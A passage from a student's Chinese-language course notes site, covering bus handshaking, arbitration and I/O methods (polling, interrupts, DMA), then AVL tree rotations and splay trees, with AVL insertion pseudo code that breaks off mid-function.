<li>I/O 设备收到 <code>Ack</code> 信号后，将 <code>ReadReq</code> 信号置低，同时释放数据总线。</li>
<li>主存储器检测到 <code>ReadReq</code> 信号已被置低后，将 <code>Ack</code> 信号置低。</li>
<li>当主存储器准备好数据后，将数据放到数据总线上，并升高 <code>DataRdy</code> 信号。</li>
<li>I/O 设备收到 <code>DataRdy</code> 信号后，读取数据总线上的数据，并在数据读取完成后发出 <code>ACK</code> 信号，表示数据已读取完毕。</li>
<li>主存储器收到 <code>ACK</code> 信号后，将 <code>DataRdy</code> 信号置低，并释放数据总线。</li>
<li>I/O 设备收到 <code>DataRdy</code> 信号后，将 <code>ACK</code> 信号置低，表示整个数据传输过程已完成，总线可以用于其他操作。</li>
</ol>
<h2 id="note-co-wk6-bus-arbitration">Bus Arbitration<a class="headerlink" href="#note-co-wk6-bus-arbitration" title="Permanent link">&para;</a></h2>
<p>总线上由多个设备共享，其中如果多个设备同时需要使用总线，就会出现冲突，这时就需要总线仲裁（bus arbitration）来解决这个问题,总线可能有多个Master，来决定哪一个I/O设备可以访问总线。这些master拥有不同的优先级</p>
<h2 id="note-co-wk6-communication-with-the-processor">Communication with the processor<a class="headerlink" href="#note-co-wk6-communication-with-the-processor" title="Permanent link">&para;</a></h2>
<ul>
<li>polling: 轮询，CPU 不断询问每个设备是否需要使用总线，直到有一个设备响应为止,轮询会浪费 CPU 大量的时间，因为大部分情况下 I/O 设备都没有请求或者还没有准备好。</li>
<li>interrupt: 中断，当设备需要使用总线时，通过中断请求（interrupt request）来通知CPU，CPU 在处理完当前任务后，会立即响应中断请求，并处理设备的需求,中断驱动的 I/O 操作可以让 CPU 在 I/O 设备读写数据的时候做其他的事情。</li>
<li>DMA: 直接内存访问，DMA 控制器直接从内存中读取数据，而不需要CPU的干预，DMA 控制器可以独立于CPU进行数据传输，这样可以提高数据传输的效率,DMA 不需要 CPU 的控制，所以不会占用 CPU 的时间，但 DMA 实际上只用于数据的传输，它与 polling 和 interrupt 并不冲突</li>
</ul></section></section>
                    <section class='print-page md-section' id='section-2-2-3' heading-number='2.2.3'>
                        <h1>高级数据结构与算法分析<a class='headerlink' href='#section-2-2-3' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-ads" heading-number="2.2.3.1"><h1 id="note-ads-_1">高级数据结构与算法分析<a class="headerlink" href="#note-ads-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 158 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 2 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 1 分钟</p>
</div>
<blockquote>
<p>授课：<a href="https://person.zju.edu.cn/0096209">张国川</a>
参考：吴一航学长的ADS讲义 </p>
</blockquote>
<p>在数据结构基础上，进一步学习数据结构的高级应用，特别是算法分析部分，偏向数学；</p>
<p>张国川老师是学术水平和教学水平都很高的老师，每每听课仿佛醍醐灌顶，富有启发;</p>
<p>奈何本人最后期末表现不佳，感谢老师，学生朽木。</p>
<h2 id="note-ads-_2">目录<a class="headerlink" href="#note-ads-_2" title="Permanent link">&para;</a></h2>
<div class="ADS_card_container" style="display: flex; justify-content: space-between;">
    <a href="#note-ads-wk1">
        <div class="ADS_card" style="--initial-text:'AVL-Splay树';--hover-text:'平衡之美\A平均之道';">
        </div>
    </a>
    <a href="#note-ads-wk2">
        <div class="ADS_card" style="--initial-text:'红黑树';--hover-text:'喜欢我红叔叔吗';">
        </div>
    </a>
    <a href="#note-ads-wk3_1">
        <div class="ADS_card" style="--initial-text:'倒排索引';--hover-text:'顺藤摸瓜';">
        </div>
    </a>
</div>

<p><br></p>
<div class="ADS_card_container" style="display: flex; justify-content: space-between;">
    <a href="#note-ads-wk3_2">
        <div class="ADS_card" style="--initial-text:'左式堆与斜堆';--hover-text:'疏影横斜\A暗香浮动';">
        </div>
    </a>
    <a href="#note-ads-wk4">
        <div class="ADS_card" style="--initial-text:'二项堆';--hover-text:'柔性定胜刚性立\A一枝还引万枝生';">
        </div>
    </a>
    <a href="#note-ads-wk5">
        <div class="ADS_card" style="--initial-text:'回溯算法';--hover-text:'众里寻他千百度，蓦然回首，那人却在，灯火阑珊处';">
        </div>
    </a>
</div>

<p><br></p>
<div class="ADS_card_container" style="display: flex; justify-content: space-between;">
    <a href="#note-ads-wk6">
        <div class="ADS_card" style="--initial-text:'分治法';--hover-text:'集中优势兵力\A个个歼灭敌人';">
        </div>
    </a>
    <a href="#note-ads-wk7">
        <div class="ADS_card" style="--initial-text:'动态规划';--hover-font-size: 0.7em;--hover-text:'物格而后知至，知至而后意诚 意诚而后心正，心正而后身修 身修而后家齐，家齐而后国治 国治而后天下平';">
        </div>
    </a>
    <a href="#note-ads-wk8">
        <div class="ADS_card" style="--initial-text:'贪心算法';--hover-text:'得即高歌失即休\A多愁多恨亦悠悠 \A今朝有酒今朝醉\A明日愁来明日愁';--hover-font-size:0.7em;">
        </div>
    </a>
</div>

<p><br></p>
<div class="ADS_card_container" style="display: flex; justify-content: space-between;">
    <a href="#note-ads-wk9">
        <div class="ADS_card" style="--initial-text:'NP完全性';--hover-text:'平芜尽处是春山\A行人更在春山外';">
        </div>
    </a>
    <a href="#note-ads-wk10">
        <div class="ADS_card" style="--initial-text:'近似算法';--hover-text:'浴不必江海\A要之去垢\A马不必骐骥\A要之善走';--hover-font-size:0.7em;">
        </div>
    </a>
    <a href="#note-ads-wk11">
        <div class="ADS_card" style="--initial-text:'局部搜索';--hover-text:'昔孟母\A择邻处';">
        </div>
    </a>
</div>

<p><br></p>
<div class="ADS_card_container" style="display: flex; justify-content: space-between;">
    <a href="#note-ads-wk12">
        <div class="ADS_card" style="--hover-font-size:0.7em;--initial-text:'随机算法';--hover-text:'江南可采莲，莲叶何田田，鱼戏莲叶间。鱼戏莲叶东，鱼戏莲叶西，鱼戏莲叶南，鱼戏莲叶北。';">
        </div>
    </a>
    <a href="#note-ads-wk13">
        <div class="ADS_card" style="--initial-text:'并行算法';--hover-text:'一花独放不是春，百花齐放春满园';">
        </div>
    </a>
    <a href="#note-ads-wk14">
        <div class="ADS_card" style="--initial-text:'外部排序';--hover-text:'独立寒秋，湘江北去，橘子洲头';">
        </div>
    </a>
</div>

<details class="note">
<summary>ADS_card 说明</summary>
<p>目录卡片使用了自定义样式，源码在<a href="https://github.com/kailqq/kailqq.github.io"><code>docs/css/card.css/ADS_card</code></a>中，使用时需要引入该样式文件。</p>
<p>使用示例
<div class="language-html highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-__codelineno-0-1"></a> <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;ADS_card&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;--initial-text:&#39;这是初始文字&#39;;--hover-text:&#39;这是悬停文字，大小为0.7em&#39;;--hover-font-size:0.7em;&quot;</span><span class="p">&gt;</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-__codelineno-0-2"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></code></pre></div></p>
<p><div class="ADS_card" style="--initial-text:'这是初始文字';--hover-text:'这是悬停文字，大小为0.7em';--hover-font-size:0.7em;">
</div></p>
</details></section><section class="print-page" id="note-ads-wk1" heading-number="2.2.3.2"><h1 id="note-ads-wk1-advance-data-structures-and-algorithm-analysis">Advance Data Structures and Algorithm Analysis<a class="headerlink" href="#note-ads-wk1-advance-data-structures-and-algorithm-analysis" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3022 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 66 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 12 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<h2 id="note-ads-wk1-avl-tree">AVL tree(平衡二叉树)<a class="headerlink" href="#note-ads-wk1-avl-tree" title="Permanent link">&para;</a></h2>
<p>AVL 数的想法是强制要求每次插入，删除之后都保证树的绝对平衡</p>
<div class="admonition note">
<p class="admonition-title">AVL 数的递归定义</p>
<p>一颗空的树或它的左右两个子树的高度差的绝对值不超过1是AVL树，同时它的左右两个子树也是AVL树（从下往上看，不要从上往下看）</p>
</div>
<ul>
<li>平衡因子(Balence factor)
   简称 <span class="arithmatex">\(bf\)</span>,计算公式为</li>
</ul>
<p>$$
   bf = height_{left}-height_{right}
   $$</p>
<p>在AVL tree 中，<span class="arithmatex">\(bf\)</span> 只能为 -1,0,1 三种情况之一</p>
<p><img alt="alt text" src="../NOTE/ADS/image.png" /></p>
<p>AVL tree 可以解决当顺序数据被插入到普通二叉搜索树的过程中，二叉搜素树会退化为链表的过程</p>
<h3 id="note-ads-wk1-_1">不同类型的插入<a class="headerlink" href="#note-ads-wk1-_1" title="Permanent link">&para;</a></h3>
<h4 id="note-ads-wk1-ll-">LL型-右旋<a class="headerlink" href="#note-ads-wk1-ll-" title="Permanent link">&para;</a></h4>
<p><strong>在某结点的左结点(L)的左子树(L)上做了插入元素的操作导致失衡，我们称这种情况为左左型，应该进行右旋转</strong></p>
<ul>
<li>A 向右旋转成为 B 的 右 child </li>
<li>B的右子树成为A的左子树</li>
</ul>
<p><img alt="alt text" src="../NOTE/ADS/image-1.png" /></p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>需要注意的是，在这里，节点A的 <span class="arithmatex">\(bf\)</span> 值只能是1，如果是0，说明左右树高相等，再插入也是AVL树，如果是-1，说明左边比右边矮，左边再长高1，也不会导致失衡</p>
</div>
<h4 id="note-ads-wk1-rr-">RR型-左旋<a class="headerlink" href="#note-ads-wk1-rr-" title="Permanent link">&para;</a></h4>
<p><strong>在某结点的 右结点(R)的 右子树(R)上做了插入元素的操作，我们称这种情况为 右右型 ，我们应该进行左旋转。</strong></p>
<ul>
<li>A 向左旋转成为B的左child</li>
<li>B 的左子树 成为 A 的右子树</li>
</ul>
<p><img alt="alt text" src="../NOTE/ADS/image-2.png" /> </p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>节点A的 <span class="arithmatex">\(bf\)</span> 值也是确定的</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>总的来说，对于LL和RR型，我们解决失衡的方式是</p>
<p>对于LL，左结点当根</p>
<p>对于RR，右节点当根</p>
</div>
<h4 id="note-ads-wk1-lr-">LR 型-左右旋<a class="headerlink" href="#note-ads-wk1-lr-" title="Permanent link">&para;</a></h4>
<p><strong>在某结点的 左结点（L） 的 右子树（R） 上做了插入元素的操作导致失衡，我们称这种情况为 左右型 ，我们应该进行左右旋。</strong></p>
<details class="info">
<summary>对于左右型，如果只进行单旋，不会解决问题</summary>
<p><img alt="alt text" src="../NOTE/ADS/image-3.png" /></p>
</details>
<ul>
<li>需要进行两次旋转(左右旋)<ul>
<li>第一次（左旋）: B左旋，成为C的左结点，C的左子树成为B的右子树</li>
<li>第二次（右旋）: A右旋，成为C的右节点，C的右子树成为A的左子树</li>
</ul>
</li>
</ul>
<p><img alt="alt text" src="../NOTE/ADS/image-4.png" /> </p>
<details class="example">
<summary>一个例子</summary>
<p><img alt="alt text" src="../NOTE/ADS/image-5.png" /></p>
</details>
<h4 id="note-ads-wk1-rl-">RL 型-右左旋转<a class="headerlink" href="#note-ads-wk1-rl-" title="Permanent link">&para;</a></h4>
<p><strong>在某节点的在结点T的 右结点（R） 的 左子树（L） 上做了插入元素的操作，我们称这种情况为 右左型 ，我们应该进行右左旋。</strong></p>
<p>同样，单旋对于RL型也没有用</p>
<ul>
<li>需要进行两次旋转(右左旋)<ul>
<li>第一次（右旋）: B右旋，称为C的右结点，C的右子树成为B的左子树 </li>
<li>第二次（左旋）: A左旋，成为C的左节点，C的左子树成为A的右子树</li>
</ul>
</li>
</ul>
<p><img alt="alt text" src="../NOTE/ADS/image-6.png" /></p>
<div class="admonition note">
<p class="admonition-title">总结</p>
<p>总的来说，对于LR和RL型，我们解决失衡的方式是</p>
<p>对于LR，左结点的右 child 当根</p>
<p>对于RL，右节点的左child 当根</p>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>如果一次插入最多只会导致插入路径上的一连串的结点失衡，我们只需要解决找到的第一个（最靠下的）失衡结点，将其解决，上面的结点自然也恢复到正常的平衡因子,所以，对于每次插入，我们至多只需要进行一次 rotation 就可以解决冲突了
但是对于删除，最坏的情况却要旋转 <span class="arithmatex">\(\log(n)\)</span> 次</p>
<p>旋转前后，结点之间的相对位置不变，亦即左边的结点仍然在左边，右边的结点仍然在右边</p>
</div>
<p>AVL 树的搜索、插入和删除操作的时间复杂度为 <span class="arithmatex">\(O(\log n)\)</span></p>
<h2 id="note-ads-wk1-splay-tree">Splay tree(伸展树)<a class="headerlink" href="#note-ads-wk1-splay-tree" title="Permanent link">&para;</a></h2>
<div class="admonition quote">
<p class="admonition-title">吴一航学长的ADS讲义</p>
<p>Splay 树的想法一方面来源于希望可以不像 AVL 那样保持严格的平衡约束，但也能保证某种层面（均摊）的对数时间复杂度，另一方面 Splay 树在访问（特别注意访问包括搜索、插入和删除）时都需要将元素移动到根结点，这非常符合程序局部性的要求，即刚刚访问的数据很有可能再次被访问，因此在实现缓存和垃圾收集算法中有一定的应用。</p>
</div>
<p>Splay 树并不在乎二叉树是否时刻都平衡，而是通过在每次操作时加上Splay操作，即通过一系列旋转将我们访问的结点移动到根结点</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Any M consecutive tree operations starting from an empty tree take at most <span class="arithmatex">\(O(M \log N)\)</span> time.</p>
<p>Splay tree 希望从一棵空树开始连续的M个操作是 <span class="arithmatex">\(O(M \log N)\)</span> 的</p>
</div>
<p>我们有两种旋转方式</p>
<p><strong>naive的方式:</strong></p>
<p>不断地把访问的结点与其父节点更换父子方式，即不断使用单旋一直转到根节点的位置，但是这种方法虽然满足了将访问的结点移动到根的需求，其路径上的结点却被移动到了很深的位置，这种方式不满足我们对于复杂度的要求</p>
<p><strong>下面是合理的旋转方式:</strong></p>
<p>对于任何不是根结点的结点 X ,我们关心它的 parent 节点 P 和它的 grandparent 结点 G:</p>
<ul>
<li>case 1: 如果 P 已经是根，直接旋转交换 P 和 X ，这与普通方法没什么区别</li>
<li>case 2: 如果 P 并不是根，又分为两种情况<ul>
<li>Zig-zag(之字型): 双旋,使得X成为树根(不一定是树的根，是XPG子树的树根)，这种情况与普通方法是一样的，与 AVL 树的 RL 和 LR 型也是一样的</li>
<li>Zig-zig(同侧型): 单旋，其实叫做单旋，实际上也是转两次，应该是为了和 AVL 树不一样才这么叫。
<strong>Zig-zig 的方法才是是与naive的方法不一样的地方</strong>,普通方法先交换了 X 和 P 的位置，再交换 X 和 G 的位置; Zig-zig 的操作方法是先交换 P 和 G ，再交换 X 和 P，相当于 X 直接跨了两步 </li>
</ul>
</li>
</ul>
<p><img alt="alt text" src="../NOTE/ADS/image-7.png" /></p>
<details class="example">
<summary>insert 1 to 7 and then find 1</summary>
<p><img alt="alt text" src="../NOTE/ADS/image-8.png" /></p>
</details>
<div class="admonition question">
<p class="admonition-title">编程实践-Find root of AVL tree</p>
<p>For each case, the first line contains a positive integer <span class="arithmatex">\(N\)</span> which is the total number of keys to be inserted.  Then <span class="arithmatex">\(N\)</span> distinct integer keys are given in the next line.  All the numbers in a line are separated by a space.</p>
<p>output the root of AVL treeeeeeeeeeeeeee!</p>
</div>
<details class="answer">
<summary>pseudo code</summary>
<div class="language-C++ highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk1-__codelineno-0-1"></a><span class="n">Define</span><span class="w"> </span><span class="n">structure</span><span class="w"> </span><span class="n">Node</span><span class="o">:</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk1-__codelineno-0-2"></a><span class="nl">data</span><span class="p">:</span><span class="w"> </span><span class="n">integer</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk1-__codelineno-0-3"></a><span class="nl">left</span><span class="p">:</span><span class="w"> </span><span class="n">pointer</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Node</span><span class="w"> </span><span class="p">(</span><span class="n">initially</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk1-__codelineno-0-4"></a><span class="nl">right</span><span class="p">:</span><span class="w"> </span><span class="n">pointer</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Node</span><span class="w"> </span><span class="p">(</span><span class="n">initially</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk1-__codelineno-0-5"></a><span class="nl">height</span><span class="p">:</span><span class="w"> </span><span class="n">integer</span><span class="w"> </span><span class="p">(</span><span class="n">initially</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk1-__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk1-__codelineno-0-7"></a><span class="n">Define</span><span class="w"> </span><span class="n">height</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="o">:</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk1-__codelineno-0-8"></a><span class="w">    </span><span class="n">If</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">NULL</span><span class="o">:</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk1-__codelineno-0-9"></a><span class="w">        </span><span class="n">Return</span><span class="w"> </span><span class="mi">-1</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk1-__codelineno-0-10"></a><span class="w">    </span><span class="nl">Else</span><span class="p">:</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk1-__codelineno-0-11"></a><span class="w">        </span><span class="n">Return</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">height</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ads-wk1-__codelineno-0-12"></a>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-ads-wk1-__codelineno-0-13"></a><span class="n">Define</span><span class="w"> </span><span class="n">LL_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="o">:</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-ads-wk1-__codelineno-0-14"></a><span class="w">    </span><span class="n">new_root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">left</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#note-ads-wk1-__codelineno-0-15"></a><span class="w">    </span><span class="n">root</span><span class="p">.</span><span class="n">left</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_root</span><span class="p">.</span><span class="n">right</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#note-ads-wk1-__codelineno-0-16"></a><span class="w">    </span><span class="n">new_root</span><span class="p">.</span><span class="n">right</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#note-ads-wk1-__codelineno-0-17"></a><span class="w">    </span><span class="n">Update</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">height</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#note-ads-wk1-__codelineno-0-18"></a><span class="w">    </span><span class="n">Update</span><span class="w"> </span><span class="n">new_root</span><span class="p">.</span><span class="n">height</span><span class="w"> </span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#note-ads-wk1-__codelineno-0-19"></a><span class="w">    </span><span class="n">Return</span><span class="w"> </span><span class="n">new_root</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#note-ads-wk1-__codelineno-0-20"></a>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#note-ads-wk1-__codelineno-0-21"></a><span class="n">Define</span><span class="w"> </span><span class="n">RR_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="o">:</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#note-ads-wk1-__codelineno-0-22"></a><span class="w">    </span><span class="n">new_root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">right</span>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#note-ads-wk1-__codelineno-0-23"></a><span class="w">    </span><span class="n">root</span><span class="p">.</span><span class="n">right</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_root</span><span class="p">.</span><span class="n">left</span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#note-ads-wk1-__codelineno-0-24"></a><span class="w">    </span><span class="n">new_root</span><span class="p">.</span><span class="n">left</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#note-ads-wk1-__codelineno-0-25"></a><span class="w">    </span><span class="n">Update</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">height</span>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#note-ads-wk1-__codelineno-0-26"></a><span class="w">    </span><span class="n">Update</span><span class="w"> </span><span class="n">new_root</span><span class="p">.</span><span class="n">height</span><span class="w"> </span>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#note-ads-wk1-__codelineno-0-27"></a><span class="w">    </span><span class="n">Return</span><span class="w"> </span><span class="n">new_root</span>
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#note-ads-wk1-__codelineno-0-28"></a>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#note-ads-wk1-__codelineno-0-29"></a><span class="n">Define</span><span class="w"> </span><span class="n">LR_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="o">:</span>
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#note-ads-wk1-__codelineno-0-30"></a><span class="w">    </span><span class="n">root</span><span class="p">.</span><span class="n">left</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RR_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">.</span><span class="n">left</span><span class="p">)</span>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#note-ads-wk1-__codelineno-0-31"></a><span class="w">    </span><span class="n">Return</span><span class="w"> </span><span class="n">LL_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#note-ads-wk1-__codelineno-0-32"></a>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#note-ads-wk1-__codelineno-0-33"></a><span class="n">Define</span><span class="w"> </span><span class="n">RL_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="o">:</span>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#note-ads-wk1-__codelineno-0-34"></a><span class="w">    </span><span class="n">root</span><span class="p">.</span><span class="n">right</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LL_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">.</span><span class="n">right</span><span class="p">)</span>
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#note-ads-wk1-__codelineno-0-35"></a><span class="w">    </span><span class="n">Return</span><span class="w"> </span><span class="n">RR_rotation</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#note-ads-wk1-__codelineno-0-36"></a>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#note-ads-wk1-__codelineno-0-37"></a><span class="n">Define</span><span class="w"> </span><span class="n">insert</span><span class="p">(</span><span class="n">root</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="o">:</span>
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#note-ads-wk1-__codelineno-0-38"></a><span class="w">    </span><span class="n">If</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">NULL</span><span class="o">:</span>
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#note-ads-wk1-__codelineno-0-39"></a><span class="w">        </span><span class="n">Create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">x</span>
